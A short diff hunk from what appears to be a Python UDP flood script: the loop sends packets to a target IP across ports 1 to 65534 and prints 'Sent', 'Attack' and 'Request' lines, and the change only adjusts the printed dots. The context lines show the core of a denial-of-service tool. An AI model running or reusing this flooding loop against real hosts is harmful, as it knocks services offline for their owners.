@@ -55,9 +55,9 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print(f"\033[97mSent:..... " +ip+ "\033[0m" )
-     print(f"\033[94mAttack:... " +ip+ "\033[0m" )
-     print(f"\033[95mRequest:.. " +ip+ "\033[0m" )
+     print(f"\033[97mSent:.. " +ip+ "\033[0m" )
+     print(f"\033[94mAttack:.. " +ip+ "\033[0m" )
+     print(f"\033[95mRequest:... " +ip+ "\033[0m" )
      if port == 65534:
        port = 1
 
